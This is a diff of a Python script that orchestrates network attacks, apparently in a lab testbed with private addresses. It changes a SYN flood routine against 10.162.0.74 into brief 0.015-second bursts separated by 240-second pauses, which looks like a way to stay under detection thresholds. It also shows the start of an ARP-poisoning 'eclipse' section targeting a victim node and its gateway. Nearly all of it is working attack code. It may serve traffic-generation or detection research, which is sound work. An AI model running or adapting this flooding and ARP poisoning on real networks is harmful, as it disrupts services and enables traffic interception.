@@ -50,7 +50,10 @@ SYNFLOOD_TARGETS = [
     ("10.162.0.74", 23),
     ("10.162.0.74", 53),
 ]
-SYNFLOOD_RESTART_INTERVAL = 10   # seconds between target rotations
+
+SYNFLOOD_FLOOD_DURATION  = 0.015   # seconds each flood runs
+SYNFLOOD_BREAK_DURATION  = 240    # seconds of silence between floods
+
 SYNFLOOD_PATH = "/synflood"
 
 # Eclipse ARP attack targets (Node 162 victim + its gateway)
@@ -140,15 +143,18 @@ def synflood() -> None:
         log(f"synflood: ERROR — binary not found at {SYNFLOOD_PATH}")
         return
 
-    proc = _run_synflood_once(*random.choice(SYNFLOOD_TARGETS))
     try:
-        while not _shutdown.wait(timeout=SYNFLOOD_RESTART_INTERVAL):
-            kill_process(proc, "synflood")
+        while not _shutdown.is_set():
             proc = _run_synflood_once(*random.choice(SYNFLOOD_TARGETS))
+            # Run for the flood duration, then stop
+            _shutdown.wait(timeout=SYNFLOOD_FLOOD_DURATION)
+            kill_process(proc, "synflood")
+            # Break between floods
+            if not _shutdown.is_set():
+                log("synflood: pausing between floods")
+                _shutdown.wait(timeout=SYNFLOOD_BREAK_DURATION)
     finally:
-        kill_process(proc, "synflood")
         log("synflood: shutdown complete")
-
 
 # ──────────────────────────────────────────────────────────────────────────────
 # ECLIPSE — ARP  (L2: ARP poisoning + iptables)
